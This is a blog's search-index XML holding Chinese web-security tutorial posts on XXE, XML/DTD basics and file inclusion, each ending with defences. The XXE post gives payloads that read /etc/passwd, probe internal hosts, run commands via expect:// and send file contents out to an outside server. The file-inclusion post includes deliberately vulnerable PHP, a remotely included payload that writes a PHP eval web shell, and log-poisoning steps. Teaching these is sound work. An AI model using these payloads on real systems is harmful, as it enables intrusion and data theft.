<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XXE漏洞介绍</title>
      <link href="/2022/01/15/xxe-lou-dong/"/>
      <url>/2022/01/15/xxe-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p><strong>前置知识：</strong>    </p><p>​    XML被设计为传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。其焦点是数据的内容。 详情–&gt;<a href="">XML基础介绍</a></p><h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>​    <strong>XXE</strong>（XML External Entity Injection）即<strong>XML</strong>外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h2 id="XXE漏洞触发点"><a href="#XXE漏洞触发点" class="headerlink" title="XXE漏洞触发点"></a>XXE漏洞触发点</h2><p>可以上传XML文件的位置且未对XML文件进行过滤</p><h2 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h2><ul><li>Content-Type值判断</li></ul><p>​    可以使用BurpSuite抓取数据包查看。若<code>Content-type=text/xml</code>或<code>Content-type=application/xml</code>；表示接收数据为xml格式，可进行漏洞检测。</p><ul><li><p>更改Content-Type为xml类型进行尝试</p></li><li><p>数据格式类型判断</p></li></ul><p>​    类似于<code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code>典型xml格式</p><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><p><strong>补充：支持的协议</strong></p><table><thead><tr><th>Libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>file</td><td>file</td></tr><tr><td>http</td><td>http</td><td>http</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>ftp</td></tr><tr><td></td><td>php</td><td>https</td><td>https</td></tr><tr><td></td><td>comepress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>comepress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p><strong>协议</strong></p><ul><li>读文件-通过DTD外部实体声明</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>内网探针-将xxe转换为ssrf</p><p>我们利用这种方法可进行内网探测：某个内网ip是否存在、对应路径文件是否存在、端口扫描等等。根据返回类型(无回显可尝试根据响应时间长度判断)的不同来判断我们想要的结果。例如：请求正确时界面无变化、请求错误时进行报错。如下测试内网是否存在ip:192.168.0.103、该ip是否开启80端口、是否存在index.txt文件。</p></li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:80&#x2F;index.txt&#x2F;&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>RCE（此类型在实战中并不常见，须在安装expect扩展的PHP环境里执行命令）</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;            &lt;!--id为执行的系统命令--&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>外部应用</strong></p><ul><li>引入外部实体</li></ul><p>在自己的服务器下放一个evil.dtd文件，通过DTD外部实体声明引入DTD文档<code>http://example.com/evil.dtd</code>，再通过解析evil.dtd文件引入外部实体声明。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [       &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt; &lt;!--http:&#x2F;&#x2F;example.com&#x2F;evil.dtd内容为--&gt;&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无回显（Blind-XXE）"><a href="#无回显（Blind-XXE）" class="headerlink" title="无回显（Blind XXE）"></a>无回显（Blind XXE）</h3><p><strong>OOB(Out-Of-Band)：</strong>使用Blind XXE 漏洞来构建一条外带数据OOB（Out-Of-Band）通道来读取数据。</p><p>​    原理：带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了-反向链接配合。</p><p><strong>实例</strong>：<code> xxx.dtd</code>文件内容：<br><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;  </code></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了读取数据的准确性这里可以用<strong>base64</strong>进行将读取内容进行编码。如下：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h2><ul><li>禁用外部实体</li></ul><p>禁用外部实体方法：</p><pre class="line-numbers language-none"><code class="language-none">PHP：libxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>过滤用户提交xml数据</p><p>关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML基础介绍</title>
      <link href="/2022/01/15/xml-ji-chu/"/>
      <url>/2022/01/15/xml-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>​    XML（EXtensible Markup Language）可扩展标记语言。XML是一种标记语言，很类似HTML，但并非HTML的替代，XML设计的宗旨是<strong>传输数据</strong>而非<strong>显示数据</strong>。</p><!--XML被设计为传输和存储数据，其焦点是**数据的内容**。--><!--HTML被设计用来显示数据，其焦点是**数据的外观*。--><h2 id="XML文档构建模块"><a href="#XML文档构建模块" class="headerlink" title="XML文档构建模块"></a>XML文档构建模块</h2><h3 id="一个-XML-文档实例-元素"><a href="#一个-XML-文档实例-元素" class="headerlink" title="一个 XML 文档实例-元素"></a>一个 XML 文档实例-元素</h3><p>XML 文档必须有一个元素是所有其他元素的<strong>父元素</strong>。该元素称为<strong>根元素</strong>。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--XML声明,定义 XML 的版本 (1.0) 和所使用的编码 UTF-8--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--4个子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--根元素结尾--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一个-XML-文档实例-属性"><a href="#一个-XML-文档实例-属性" class="headerlink" title="一个 XML 文档实例-属性"></a>一个 XML 文档实例-属性</h3><p>​    XML 元素可以在开始标签中包含属性，且属性值必须被引号包围，单引号和双引号均可使用。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个属性--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sex</span><span class="token punctuation">></span></span>female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sex</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个子元素--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>​    实体是用来定义普通文本的变量。实体引用是对实体的引用。所有实体均以<code>&amp;</code>开始，以<code>;</code>结束。当文档被XML解析器解析时，实体就会被展开。下面实体在XML中被预定义。</p><table><thead><tr><th>实体引用</th><th>字符</th></tr></thead><tbody><tr><td><code>&amp;lt;</code></td><td>&lt;</td></tr><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr><tr><td><code>apos;</code></td><td>‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>​    PCDATA的意思是<strong>被解析</strong>的<strong>字符数据</strong>。可想象为开始标签与结束标签之间的文本，是会被解析器解析的文本，这些文本将被解析器<strong>检查实体</strong>以及<strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>​    被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 <code>&amp;amp;</code>、<code>&amp;lt; </code>以及<code> &amp;gt;</code> 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>​    CDATA 的意思是字符数据（character data）。</p><p>​    CDATA 是<strong>不会被解析器解析</strong>的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p><h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 <strong>XML 文档中</strong>，也可作为一个<strong>外部引用</strong>。</p><h2 id="一个DTD在XML内部声明的实例"><a href="#一个DTD在XML内部声明的实例" class="headerlink" title="一个DTD在XML内部声明的实例"></a>一个DTD在XML内部声明的实例</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!--XML声明,定义 XML 的版本 (1.0)--&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;  &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有4个元素：“to、from、heading、body”--&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;&lt;!--定义 from 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!--定义 heading 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;&lt;!--定义 body 元素为 &quot;#PCDATA&quot; 类型--&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;&#x2F;to&gt;  &lt;from&gt;John&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一个DTD在XML外部声明的实例"><a href="#一个DTD在XML外部声明的实例" class="headerlink" title="一个DTD在XML外部声明的实例"></a>一个DTD在XML外部声明的实例</h2><p>​    若 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>包含DTD的“note.dtd”文件:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拥有外部DTD文档实例：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;!--包含DTD的“note.dtd”文件,封装在DOCTYPE定义中--&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><ul><li>参数实体只能在DTD中使用</li><li>参数实体可嵌套定义，但内层定义的参数实体<code>%</code>需要<strong>HTML转义</strong>。</li></ul><table><thead><tr><th></th><th>一般实体声明：</th><th>引用：</th><th>参数实体声明：</th><th>引用：</th></tr></thead><tbody><tr><td>内部实体</td><td><code>&lt;!ENTITY 实体名 实体的值 &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 &quot;实体的值&quot;&gt; </code></td><td>%实体名；</td></tr><tr><td>外部实体</td><td><code>&lt;!ENTITY 实体名 SYSTEM  url &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 SYSTEM url&gt; </code></td><td>%实体名；</td></tr></tbody></table><p><strong>实例：</strong></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;    &lt;!ENTITY normal3 SYSTEM &quot;http:&#x2F;&#x2F;xml.org&#x2F;hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;    &lt;!ENTITY % normal4 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;    %normal4;            &lt;!-- 引用参数实体 --&gt;]&gt;&lt;message&gt;&amp;normal;&lt;&#x2F;message&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="为什么使用DTD"><a href="#为什么使用DTD" class="headerlink" title="为什么使用DTD"></a>为什么使用DTD</h2><ul><li>通过 DTD，每一个 XML 文件均可携带一个有关其<strong>自身格式</strong>的描述。</li><li>独立的团体可一致地使用某个标准的 DTD 来<strong>交换数据。</strong></li><li>应用程序也可使用某个标准的 DTD 来<strong>验证从外部接收到的数据</strong>。</li><li>还可以使用 DTD 来<strong>验证您自身的数据</strong>。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2022/01/15/wen-jian-bao-han/"/>
      <url>/2022/01/15/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。<!--注：其他语言也可能出现包含漏洞--></p><h2 id="文件包含函数-PHP"><a href="#文件包含函数-PHP" class="headerlink" title="文件包含函数-PHP"></a>文件包含函数-PHP</h2><table><thead><tr><th>php函数：</th><th>解析：</th></tr></thead><tbody><tr><td>Include</td><td>执行到include时才包含文件，找不到被包含文件时产生警告，脚本继续执行</td></tr><tr><td>Include_once</td><td>与Include()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr><tr><td>Require</td><td>程序一运行就包含文件，找不到被包含的文件时产生致命错误，并停止脚本</td></tr><tr><td>Require_once</td><td>与Require()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr></tbody></table><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h4 id="漏洞示例：（无限制）"><a href="#漏洞示例：（无限制）" class="headerlink" title="漏洞示例：（无限制）"></a>漏洞示例：（无限制）</h4><p>在index.php中有如下代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    在提交url时，当在url中取得filename参数的值时，include直接包含了这个文件。如：</p><p><code>http://www.xxx.com/index.php?filname=xxx.php</code></p><p>​    若xxx.php为已存在敏感文件，则会造成一些敏感信息泄露的问题。若xxx.php文件为用户可控（结合文件上传），则会造成严重危害。若xxx.php文件不存在，通常会产生报错信息，从而可能会泄露网站的绝对路径，造成安全隐患。</p><h4 id="漏洞示例：（有限制）"><a href="#漏洞示例：（有限制）" class="headerlink" title="漏洞示例：（有限制）"></a>漏洞示例：（有限制）</h4><p>核心代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与上述漏洞不同的是，服务端将所包含文件加后缀<code>.html</code>强制转换成html类型去执行。</p><p>绕过方法：</p><p>​    windows文件命名不超过256个字符，可使用<code>./</code>进行垃圾字符填充，使.html没有空间写入文件名中。</p><p>长度截断：windows,点号长于256，linux长于4096</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>​    在php语言中，若使用远程文件包含，首先确定php是否开启远程文件包含功能：allow_url_include = On</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">allow_url_fopen <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//默认开启</span>allow_url_fopen <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span>allow_url_include <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//php 5.2以后添加,安全方便的设置(默认关闭)</span>allow_url_include <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p><strong>前提：</strong></p><ol><li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li><li>用户能够控制该动态变量。</li></ol><h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><!--目标主机文件存在，且有相应权限--></p><h3 id="2、远程包含shell"><a href="#2、远程包含shell" class="headerlink" title="2、远程包含shell"></a>2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p><p>示例：</p><p>个人服务器地址:<strong><a href="http://twowards.top/">http://twowards.top</a></strong></p><p>在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fputs(fopen("shell.php","w"),"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>")</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><!--代码解析：--><!--fputs(要写入的打开文件,写入的字符串内容)--><!--fopen(规定要打开的文件，访问此文件的类型，此处为写入w)--><p>访问<code>http://www.xxx.com/index.php?filname=http://twowards.top/echo.txt</code>，将会在index.php所在目录生成木马文件shell.php<code>&lt;?php eval($_POST[cmd]);?&gt;</code></p><h3 id="3、本地包含配合文件上传"><a href="#3、本地包含配合文件上传" class="headerlink" title="3、本地包含配合文件上传"></a>3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p><!--直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。--><h3 id="4、php伪协议"><a href="#4、php伪协议" class="headerlink" title="4、php伪协议"></a>4、php伪协议</h3><p>以参数为filename示例：</p><table><thead><tr><th>协议</th><th>用法</th><th>含义</th></tr></thead><tbody><tr><td>file://</td><td>?filename=file://绝对路径</td><td>访问本地文件系统</td></tr><tr><td>php://filter</td><td>?filename=filter/read=convert.base64-encode/resource=xxx.php</td><td>读取源码（此处读取到base64加密后的源码）</td></tr><tr><td>php://input</td><td>?filename=php://input【POST DATA】<?php phpinfo()?></td><td>执行php代码。前提：allow_url_include=on</td></tr></tbody></table><p>补充：php://input 用post提交php代码时，可提交<code>&lt;?php system(&#39;xxx&#39;)?&gt;</code>来执行系统命令。如：<code>&lt;?php system(&#39;net user&#39;)?&gt;</code>查看用户</p><h3 id="5、包含apache日志文件"><a href="#5、包含apache日志文件" class="headerlink" title="5、包含apache日志文件"></a>5、包含apache日志文件</h3><p>当php文件存在本地包含漏洞时，却无法上传文件时，导致无法深度利用。Apache日志文件也是另一种思路。</p><p>前提：可找到Apache日志路径</p><p>原理：</p><p>Apache运行后通常默认生成两个日志文件access.log（访问日志），error.log（错误日志）。access.log记录了客户端每次请求服务器响应的相关信息。当访问资源不存在时，同样也会记录。</p><p>示例：</p><p>当请求：<code>http://www.xxx.com/&lt;?php phpinfo();?&gt;</code>时，Apache会记录<code>&lt;?php phpinfo?&gt;</code>，并写入access.log。</p><p>然而到此处并不能直接包含此日志文件：一句话木马在日志里发生了变形。如下：</p><p><code>127.0.0.1 - - [19/Nov/2021:15:00:00 +0800] &quot;GET /%3C?php%20phpinfo();%3E&quot;</code></p><p>可以看到php中的<code>&lt; &gt;空格</code>被浏览器进行了转码。</p><p>此时攻击者可利用BurpSuite来绕过编码，之后使用包含漏洞来包含access.log，去执行其中php代码。</p><p>补充：安全起见，Apache安装时尽量不要使用默认路径。</p><h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>1、严格控制包含中参数是否外部可控。</p><p>2、路径限制：限制被包含文件只能在某一文件夹内，禁止目录跳转字符。如<code>./</code>。</p><p>3、包含验证：被包含文件是否在白名单中。</p><p>4、尽量不使用动态包含，固定包含文件如：include(“head.php”);。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/14/hello-world/"/>
